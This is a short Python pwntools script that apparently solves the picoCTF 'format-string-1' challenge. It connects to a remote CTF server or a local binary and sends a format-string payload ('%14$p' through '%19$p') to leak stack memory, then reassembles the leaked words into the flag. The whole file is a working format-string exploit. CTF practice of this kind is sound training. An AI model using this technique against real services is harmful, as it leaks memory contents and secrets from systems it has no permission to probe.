#!/usr/bin/env python3

from pwn import *
from binascii import unhexlify

exe = ELF("./format-string-1_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mimas.picoctf.net", 52975)

    return r


def main():
    r = conn()
    payload=''
    for i in range (14,20):
        payload += f'%{i}$p'
    r.recvuntil(b'you:\n')
    r.sendline(payload.encode())
    r.recvuntil(b'order:')
    output=r.recvline()[:-1].split(b'0x')
    print('list:',output)
    flag=b''
    for add in output :
        if add!=b' ':
            flag+=unhexlify(add.ljust(8,b'0'))[::-1]
    print(flag)
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
